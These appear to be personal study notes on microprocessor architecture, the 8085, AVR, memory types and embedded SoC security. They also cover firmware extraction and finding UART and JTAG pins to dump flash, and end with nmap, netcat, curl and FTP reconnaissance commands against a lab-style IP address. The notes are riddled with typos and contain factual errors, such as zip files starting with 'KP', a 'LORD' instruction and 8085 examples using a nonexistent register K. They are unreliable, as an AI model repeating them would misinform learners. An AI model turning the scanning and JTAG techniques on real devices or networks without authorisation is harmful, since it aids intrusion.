+MOVWF TOSL // TOSL = 0x72
+RETURN
+jump to 0x000C72
+
+===
+microprocessor
+
+microprocessor is a controlling unit of a micro-computer, fabricated on a small chip capable of performing ALU(arithmetic lofical unit) operations and communicating with the other devices connected to it.
+
+microprocessor consists of an ALU, register array, and a control unit.
+-ALU performs arithmetical and logical operations on the data received from the memory or an input device.
+-register array consists of registers identified by letters like B, C, F, E and accumulator
+-the control unit controls the flow of data and instructions within the computer
+
+fetch, decode, execute
+
+initially, the instructions aree stored in the memory in a sequential order
+the microprocessor fetches those instructiions from the memory
+then decodes it and executes those instructions till STOP instruction is reached
+later, it sends the result in binary to the output port
+between these processes, the register storees the temporarily data and ALU performs the computing functions
+
+instruction set, it is the set of instructions that the microprocessor can understand
+bandiwidth, it is the number of bits processed in a single instruction
+clock speed, it determines the number of bits processed in a single instruction
+word length, it depends upon thee width of internal data bus, registers, ALU. eetc. An 8-bit microprocessor can process 8-bit data at a time. The word length ranges from 4 bits to 64 bits depending upon the type of the microcomputer
+
+some of the most prominent features of any microprocessor
+-cost effective, the microprocessor chips are available at low prices and results its low cost
+-size, the microprocessor is small size chip, hence is portable
+-low power consumption, microprocessors are manufactured by using meetaloxide semiconductor technology, which has low poweer consumption
+-versatility, the microprocessors are versatile as we can use the same chip in a number of applications by configuring the software program
+-reliablity, the failure rate of an IC in microprocessors is very low
+
+===
+RISC stands for reduced instruction set computer
+it is designed to reduce the execution time by simplifying the instruction set of the computer
+using RISC processors, each instruction requires only one clock cycle to execute results in uniform execution time
+this reduces the efficiency as there are more lines of code, hence more RAM is needed to store the instructions.
+the compiler also has to wotk more to convert high-level language instructions into machine code
+some of the RISC processors are:
+power PC:601, 604, 615, 620
+DEC Alpha:210642, 211066, 21068, 21164
+MIPS:(R100000) RISC processor
+PA-RISC:HP 7100LC
+
+architecture of RISC
+RISC microproceessor architecture uses highly-optimiized set of instructions, it is used in portable devices like apple ipod dudee to its power efficiency
+
+characteeristics of RISC
+-it consists of simple instructions
+-it supports carious data-type formats
+-it utilizes simple addressing modes and fixed length instructions for pipelining
+-it supports reegister to use in any context
+-one cycle execution timee
+-"LORD" and "STORE" instructions are used to access the memory location
+-it consists of larger number of registers
+=it consists of less number of transistora
+
+===
+CISC, stands for complex instruction set computer
+it is designed to minimize the number of instructions per program, ignoring the number of cycles per instruction
+the emphasis is on building compleex instructions directly into the hardware
+
+the compiler has to do very littlee work to translate a high-level language into assembly level langue/machine code because the length of the code is relatively short, so very little RAM is reequired to store the instructions
+
+some of the CISC processors are
+IBM 370/168
+VAX 11/780
+Intel 80486
+
+its architecture is designed to decrease the memory cost becuase more storage is needed in larger programs resulting in higher memory cost. To resolve this , the number of instructions per program can be reduced by embedding the number of operations in a signle instruction
+
+characteristics of CISC
+-varity of addressing modes
+-larger number of instructions
+-variable length of instruction formats
+-several cycles may be required to execute one instruction
+-instruction-decoding logic is complex
+-one instruction is required to support multiple addressing modes
+
+===
+special processor, theree are the processors which are designed for some special purposes.
+
+coprocessor
+a coprocessor is a specially designed microprocessor, which can handle its particular function many times faster than the ordinary microprocessor
+for example, math coprocessor
+some Intel math-coprocessors are
+8087-used with 8086
+80287-used with 80286
+80387-used with 80386
+
+input/output processor
+it is a specially designed microprocessor having a local memory of its own, which is used to control I/O devices with minimum CPU involvement
+for example, DMA(direct memory access) controller
+	keyboard/mouse controller
+	graphic display controller
+	SCSI port controller
+
+Transputer(transistor computer)
+a transputer is a specially designd microprocessor with its own local memory and having links to connect one transputer to anotheer transputeer for inter-processor communications. 
+It was first deisgned in 1980 by lnmos and is targeted to the utilization of VLSI(veery large0scale integration) technology
+a transputeer can be used as a single processor system or can be connected to external links, which reduces the construction cost and increases the performance.
+
+DSP(digital signal processor)
+the processor is specially designed to process the analog signals into a figital form.
+this is done by sampling the voltage level at regular time intervals and converting the voltage at that instant into a figital form.
+this process is performeed by a circuit callede an analogue to digital converter, A to D converter or ADC
+A DSP contains the following components
+-program memory, it stores the programs that DSP will use to process data
+-data memory, it stores the information to be processed
+-compute engine, it performs the mathematical proceessing, accessing the program from the program memory and the data from the data memory
+-input/output, it connects to thee outside world
+its applications are
+-sound and music synthesis
+-audio and video compression
+-video signal proceessing
+-2D andd 3D graphics acceleration
+for example, texas instrument;s TMS 320 series, e.g. TMS320C40, TMS320C50
+
+===
+8085 microprocessor functional units
+-accumulator
+	it is an 8-bit register used to perform arithmetic, logical, I/O & LOAD/STORE operations. it is conneected to internal data bus &ALU
+-arithmetic and logic unit
+	it performs arithmetic and logical operations like addition, subtraction, AND, OR, etc. on 8-bit data
+-general purpose register
+	there are 6 geneeral purpose registers in 8085 processor, i.e.B,C,D,E,H,L. each register can hold 8-bit data
+	these registers can work in pair to hold 16-bit data and their pairing combination is like B-C, D-E,H-L
+-program counter
+	it is a 16-bit register used to store the memory address location of the next instruction to be executed. Mircroprocessor increments the program whenever an instruction is being executed, so that the program counter points to the memory address of the next instruction that is going to be executed
+-stack pointer
+	it is also a 16-bit registeere works like stack, which is always invremented/decremented by 2 during push&pop operstions	
+-temporary register
+	it is a 8-bit register, which holds the temporary data of arithmetic and logical operations
+-flag reegisteer
+	it is an 8-bit reegister having five 1-bit flip-flops, which holds either 0 or 1 depending upon the result stored in the accumulator
+	these are the set of 5 flip-flops
+	sign(S)
+	zero(Z)
+	auciliary carry(AC)
+	parity(P)
+	carry(C)	
+-instruction regiser and decoder
+	it is an 8-bit register. When an instruction is fetched from memory then it is stored in the instruction register. Instruction decoder decodes the information present iin the instruction register.
+-timing and control unit
+	it provides timing and control signal to the microprocessor to perform operations. 
+	following are the timing and control signals, which control external and internal circuits
+	control signals: READY, RD, WR, ALE
+	status signals: S0, S1, IO/M
+	DMA signals: HOLD, HLDA
+	reset signalsL RESET IN, RESET OUT
+-interrupt control
+	it controls the intrrupts during a process.
+	when a microprocessor is executing a main program andd whenever an interrupt occurs, the microproceessor shifts the control from the main program to process the incoming request. after the reequest is completed, the control goes back to the main program
+	there are 5 interrupt signals in 8085 microproceessorL INTR, RST 7.5, RST 6.5, RST 5.5, TRAP
+-serial input/output control
+	it controls the serial data comunication by using these two instruction SIC(serial inout data), and SOD(serial output data)
+-address buffer and address-data buffer
+	the content stored in the stack pointer and profram counter is loaded intothe address buffer and address-data buffer to communicate with CPU. 
+	the memory and I/O chips are connected to these buses.
+	the CPU can exchange the deesired data with the memory and I/O chips
+-address bus and data bus
+	data buses carries the data to be stored. it is bidirectional
+	address buses carries the location to where it should be stored and it is unidirectional
+
+addressing modes in 8085
+there are the instructions used to transfer the data from one register to another register, from the memory to the refister, and from the register to the memory
+-immediate addressing mode
+	in this mode, the 8.16 bit data is specified in the instruction itself as one of its operand. For example: MVI K, 20F: means 20F is copied into register K
+-register addressing mode
+	in this mode, the data is copied from one register to another. For example: MOVE K, B:means data in reegister B is copied to register K.
+-direect addressing mode
+	in this mode, the data is directly copied from the given address to the register. For exampkle: LDB 500K:means the data at address 5000K is copied to register B
+-indirect addressing mode
+	in this mode, the data is transferreede from one register to another by using the address pointed bu the register. For example: MOV K,B:means data is transferred from the memory address pointed by the register to the register K
+-implied addressing mode
+	the mode doesnt require any operand; the data is speecified by the opccode itself. For example:CMP
+
+interrupts in 8085
+inteerrupts are the signals generated by the external devices to request the microprocessor to perform a task
+-vector interrupt
+	in this type of interrupt, the interrupte address is known to thee processor
+-non vector interrupt
+	in this type of interrupt, the interrupte address is not known to thee processor, so the interrupt needs to be sent externally by the device to perform interrupts
+-maskable interrupt
+	in this type of interrupt, we can disable the interrupt by writing some instructions into the program
+-non maskable interrupts
+	in this type of interrupt, we can not disable the interrupt by writing somee instructions into the program
+-software interrput
+	in this type of interrupt, the programmer has to add the instructions into the program to execute the interrupt
+-hardware interrupt
+
+INTA is not an interrupt, it is used by the microproceessor for sending acknowledgement
+
+interrupt service routine(ISR)
+a small program or a routine that when executed, services the corresponding interrupting source
+
+===
+8086 is an enhaced version of 8085
+
+8086 microprocessor is divideed into two functonal units
+EU(execution unit)
+BIU(bus Interface unit)
+
+===
+multiprocessor 
+multiprocessor mmeans a multiple set of processors that executes instructions simultaneously
+there aree three basic multiprocessor cconfigurations
+-coproceessor configurations
+-closely coupled configuration
+-loosely coupled configuration
+
+===
+# AVR
+- interrupt vector table
+  - located in FLASH memory
+  - starts at 0x0000
+  - 0000 reset
+  - 0002 external interrupt. pin16
+  - 000c watchdog timeout
+  - 0024 UART/serial receive/complete
+- interrupt occurs
+  - check if it is enabled
+  - store PC on the stack
+  - load PC from the interrupt vector
+  - RETI, return from  interrput
+    - pop PC from stack
+    - set "I" bit, back to interrupt enable 
+- bootloader on board receieves the executable and writes it to flash
+- servor motor
+  - analog, vary the voiltage
+  - PWM
+    - cycle time 20ms(50HZ)
+    - pulse width 0ms = 0%, 20ms = 100%
+
+oscilloscope
+provides a visual display of electrical signals and how they change over time
+
+binwalk+IDA+qemu
+
+squashfs
+
+du -h
+
+===
+binwalk setup.exe                         
+dd if=setup.exe of=test bs=1 count=7615744 
+
+binwalk -e DCH-S150A1_FW101B10.bin
+
+file ls 
+ls: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
+
+
+===
+strutureed binary files 
+*ACSII,unicode
+*portable executable(PE) file format
+	PE file format is used by microsoft windows to load compiled binaries, such as EXEs, DLLs, systeem drivers.etc, into RAM and run the code found within
+
+file signatures
+*.zip starts with KP
+docs + file, to see the file format
+
+PE file format
+A PE file starts with a MZ signature
+because it is made up of two separate executables
+*a MS-DOS executable stub,
+	a leftover from the windows 95 days when programs might include both a MS-DOS runtime and a win32 runtime in the same executable
+*the main PE runtime
+
+
+
+universal asynchronous receiver transmitter
+A uart can implement RS232, but it can also implement other serial protocols
+RS-232 sereial communication standard
+25 pin conneeector/ 9 pin conneector 
+starndardized the voltage level at each pin
+logical 0 iis between 3 volts and 15 volts
+logical 1 iis between -3 volts and -15 volts
+each pin tolerateees a shortage with any other pin of the interface without  any permanent damage
+some frive chip is used to convert TTL(transistor to transistor) logic level where 0 is 0 volt and 1 is at VCC to rs-232 levels
+
+RX,TX,GND
+
+during a boot, a lot of information will be printeede to serial interface(word interface) for testing and deveelopment purpose
+which means TX pin would oscillate betweeen 0 and 1
+
+test resistance of each pin refereence to ground and VCC 
+and power up the device test volatge of each pin
+
+to comfirm we have corrctly indentified the  pinout of the serial intereface(word interface), we have to connect the serial interface to out PC using a terminal emulator. we need a USB TTL serial adapter
+
+screen command 
+ctrl-a k, to kill 
+try one of the common baud rate
+
+find UART
+search on internet
+labeeled on PCB
+find candiidates
+use a multi-meter
+follow PCB traces
+use jtagulator
+logic analyzer
+
+
+JATG
+is an industry standard, usually implementeede in complex integrated circuits
+was issued for the first timee in 1990, with the purpse to simplify the testing of PCB after manufacture
+it allowed controllability and observability of eeach bit of internal memeory of each  inteegrated circuit
+and allowed to check the integrity of each single trace connecting differeent integrated circuits in the PCB
+controllability is the aboloty to easily ser, to zero or to one, ech internal bit of memory of an integrated circuit to check that none of them is stuck ar zero or one
+observability is the ability to easily check the value of each internal bit of memory or register
+it is achieved using additional circuitry and specialized long shift registers
+a side effect of this purpose is the possibility to read and write the flash memory content
+in-circuit debugging means being able to run a debugger on the real firmware running on the real hardware
+
+TCK, test clock
+TDI, test data in
+TDO, test data out
+TMS, test mode select
+TRST, test reset
+
+JTAG in hacking
+read.write EEPROM
+break into the boot cycle
+
+interface board, bus pirate/but blaster etc.
+JTAG software, openOCD
+
+the quest for JTAG
+seatch on internet
+search labels on PCS, like TCK, TDI, TDO, TMS
+no standardizeed connectors and pin-out
+few popular pinouts
+jtagtest.com/pinouts
+pin headers candidates
+	row 5/6 pins, double row 10,12,14,20 pins
+use a multi-meter
+	finding GND and VCC  is easy
+	TMS and TDII have a pullup resistor
+	TRST can usually have a pull up or pull down resistor
+	RDO should be an high impedance input
+follow PCB traces
+JTAgulator
+
+why JTAG is not working
+missing TRST pull-up
+missing resistors
+anothere function on JTAG pin
+JTAG software disabled
+JTAG peremanently disabled
+
+Emulation environment
+CPU architecture
+similar board
+QEMU: quick emulator
+	System Mode
+	User Mode
+	Vitualization Mode	
+
+QEMU User Mode
+Binary file CPU
+file bin/assistant
+bin/assistant: ELF 32-bit LSB executable,MIPS32 
+
+qemu-mips[tab]
+choose qemu-mipsel, el stand for littlee endian
+
+
+===
+JTAG, Joint Test Action Group
+test access port and boundary-scan architecture
+TCK, test clock
+TMS, test mode select
+TDI, test data input
+TDO. test data output
+
+the bus is used as a test bus for Boundary-Scan of ICs, as in deign-for-testability(DFT)
+to use JTAG, during the design, you most select JTAG compatible devices.
+ICs supporting JTAG will have thee ffour additional pins listed above
+in addition to having the pins listed above each device most have a Boundary-Scan Register.
+theBoundary-Scan reigster may be eused to test the inteerconnection betweeen ICs or test with in the IC
+Boundary-scan tests can be useed to check continuity between devices.
+Continuity checks on PWB(printed wiring board) nets may be performed by sending out a know pattern and reciving that same pattern at the input to another IC(s)
+Not receiving thee test signal or patteern would indicate a broken PWB tracee, a failed IC, or cold solder joint
+
+===
+CC1110Fx/CC1111Fx, low poweer SoC(System-on-chip) with a 1Ghz RF transceiver
+
+GoodFET, is an open-source JTAG adapter(universal serial bus interface)
+
+FCC ID on the back of a phone, which tells what frequencies it transmits to
+my black iphone7: BCG-E3085A
+An FCC ID is the product ID assigned by the FCC to identify wireless products in the market
+
+ISM(industrial scientific medical band), unlicensed, maximum output power is 30dBm(1 watt)
+
+RF transmitter using ASK modulation technique(amplitude shift keying)
+
+.wav file, using audacity to edit
+
+===
+the differences between a microcontroller and a microprocessor
+- a microcontroller is microprocessor (a.k.a CPU core or cores) with additional peripherals on-chip
+- those therms come from the 1970s,
+	- where a microprocessor, eg, Motorola 5800 or Intel 8086
+		would have an address bus, a data bus, and control lines
+	- and a microcontroller, eg, Motorola 6801 or Intel 8051 
+		would have peripheral I/O pins serial ports, parallel I/O. timer I/O, etc.
+		but no external memory bus (you were stuck with what was on the chip)
+- microprocessors executed their programs from external ROM 
+	and microcontrollers would use internal masked (as in programed at the factory by changing the IC photo mask) ROM	
+	the only practical erasable ROMs were UV-erased EPROMS, 
+	electrically erasable PROMS(EEPROMS) were expensive, slow, and not very dense
+
+
+* the line between them is fading away
+*	modern microcontrollers such as the Motorola 6812 series have an external memory bus and peripheral I/O pins at the same time, and can be used as either a microprocessor or microcontroller
+* spi or i2c falsh or memory
+
+* flash, a special typoe of memory that works like both RAM and ROM.
+* you can wrtie information to flash memory, like you can with RAM, but that information isnt erased when the power if off, like it is with ROM
+
+===
+RAM:
+- stack (local varianles placed in stack) 
+- all global variabless
+- functions that specificied with special keyword ( for example, __ramfuc for IAR) as runned from RAM
+
+SRAM, static RAM:
+- SRAM is very fast and the fastest storage device to read and write currently
+- it is also very expensive, so it is only used in demanding places, such as the first and second level buffer of CPU
+
+DRAM, dynamic RAM:
+- DRAM keeps data for a short time and its operation is slower than the SRAM, but it is still faster than the ROM
+- in addition, it's much cheaper than SRAM
+- DRAM is divided into many kinds
+		- FPRAM (fast page RAM), EDORAM, SDRRAM, DDR, RAM, RFRAM and so on
+* the so-called "dynamic RAM" in dynamic memory refers to when we write data to the DRAM, 
+*	atfer a period of time, the data would be lost, so we need an extra circuit to refresh the memory
+
+types of ROM:
+- PROM, programmable ROM
+	is programed once that can not be modified, this is an early product, now it is gone
+- EPROM, erasable and programmable ROM
+	is a kind of universal memory that erases the original program by ultraviolet radiation
+- EEPROM, electronically erassable and programmable ROM
+	- expensive, long writing time
+
+flash:
+- flash memory combines the adcantages of ROM and RAM, it has EEPROM, but also can read data quickly without power lost (NVRAM)
+-	NOR flash and NAND flash
+- all functions (no differents where it's will run)
+- all constants
+- variables iniitialization values
+* for AVR, you neeed to use keyword PROGMEM to place any constant to flash (funtions dont need that), while for ARM keyword const will be enough
+
+inside an embedded edvice is a printedd circuit board (PCB) includes
+- processsor
+	central processing unit, CPU
+	a processor would embedded inside a system-on-chop (SoC)
+- volatile memory
+	volatile memory usually implemented in dynamic RAM (DRAM) chips in discrete packages
+	volatile memory is the memory that the processor uses while it's in action	
+	its contents are lost when the device powers down
+	DRAM memory operates at frequencies close to the processor frequency
+	and it needs wide bues in order to keep up with the processor
+- nonvolatile memory
+	nonvolatile memory is where the embedded device stores data that needs to persist after power to the device is removed
+	this memory storage can be in the form of EEPROMS, flash memory, or even SD cards and hard drives
+	nonvolatile memory usually contains code for booting as well as stored applciations and saved data
+- analog components
+	such as resistors, capacitors, and inductors 
+- external interfaces
+	external interfaces provides the mean sfor the SocC to make connection to the outside world
+	the interfaces can be connected to other commerical off-the-shelf (COTS) chips as part of the PCB system interconnect
+		- a high-speed bus interface to DRAM 
+		* USB and PCI Express (PCIe) are examples of hjigh speed interfaces that connect devieces externally
+		- a low-speed interfaces, such as I2C and SPI to a sensor
+		
+===
+miniaturization allows an SoC to have more intellectual property (IP) blocks		
+an exmaple of an Intel Skylate SoC
+this die contains multiple cores, including the main CPU cores, the Intel Converged Security and Management Engine (CSME), the GPU and much more.
+internal buses in an SoC are harder to access than external buses, making SoCs an inconvenient starting point for hacking
+
+SoCs can contain the following IP blocks:
+-	several (micro)processor and peripherals
+		for instance, an application processor, a crysto engine, a video accelerator, and the I2C interface driver
+- volatile memory
+		In the form  of DRAM ICs stacked on top of the Soc, SRAMS or register banks
+- nonvoltile memory
+		- In the form of on-die read-only memory (ROM), one-time proframmable (OTP) fuses, EEPROM, and flash memory
+		- OTP fuses typically encode critical chip configuration data, such as identity information, lifecycle stage, and anti-rollback versioning information
+- internal buses
+		the internal buses could be susceptible to spoofing, sniffing, injection, and all other forms of man-in-the-middle attacks.
+
+software is a structured collection of CPU instructions and data that a processor executes
+embedded devices can contain some of the following types of software:
+- initial boot code
+		- the initial boot code is the set of instructions a processor executes when it's first powered in
+		- the initial boot code is generated by the processor manufacturer and stored in ROM
+		- the main function of the boot ROM code is to prepare the main processor to run the code that follows
+- bootlaoder
+		- the bootlaoder initializes the system after the boot ROM executes
+		- it is typically stored on nonvolatile but mutable storage, so it can be updated in the field
+		- the PCB's original equipment manufacturer (OEM) generates the bootloader, allowing it to initilaized PCD-level components
+		- it may also optionally lock down some security features in addition to its primary task of loading and authenticating an operating system or trusted execution environment (TEE)
+		- the bootlaoder may provide functionality for provisioning a device or debugging
+		- being the earliest mutable code to run on a device, th ebootlaoder is an attractive target to attack, less-secure devices may ahve a boot ROM that doesnt authenticate the bootlaoder, allwoing attacks to repalce the bootladoer code easily
+			- bootloaders are authenticated with digital signatures, which are typically verified by embedding a public key )or the hash of a public key) in the booot ROM or fuses, because the public key is hard to modify, it's considered the root of trust.
+			- the manufacturer signs the bootloader using the private key associated with the public key, so the boot ROM code can verify and trust that the manufacturer produced it.
+			- once the bootloader is trusted, it can, in turn, embed a public key for the next stage of code and provide trust that the next stage is authentic. This chian of trust can extend all the way down to application running on an OS
+			- theoretically, creating this chain of trust seems pretty secure, but the scheme is vulnerable to a number of attacks, ranging from exploiting verifivation weaknesses to fault injection, timing attacks, and more
+- trusted execution environent (TEE) OS and trusted applcaitions
+	- TEE is common in phones and tablets based on systems such as Android.
+		- the idea is to create a virtual secure SoC bu paritioning an entire SoC into secure and nnonsecure worlds
+		- the goal is to keep all nonsecure and complex opeerations, such as user applcaitions, in the nonsecure world, and all secure operations, such as banking applciation in the secure world
+- firmware images
+	- firmware is the low-level software that runs on CPUs or peripherals
+	- simplle peripherals in a device are often fully hardware based, but more complex peripherials can contain a microcontroller that runs firm ware
+- main operating system kernal and appliations
+	- the main OS in an embedded system can be a gemeral-purpose OS, like Linux, or a real-time OS, like VxWorks or FreeRTOS.
+	
+========
+### tools
+- nmap -p- 10.10.10.142
+  - nc -vv 10.10.10.142 8091
+    - JSON-RPC
+    - curl -X POST --data '{"xyz"}' httpss://10.10.10.142:9810
+  - curl httpss://10.10.10.142:9810
+- nmap 10.10.10.142
+  - Availiable ports
+  - ftp 10.10.10.142
+    - ftp> get anonymous.txt
+  - nc -vz -u 10.10.10.142 30301
+- tcpdump -X
+- ifconfig
+- :set paste
+- otool
+- xxd
+- lldb
+- g++ -Os
+- g++ -O2
+
+
+
+
+
+
+
+
+
+
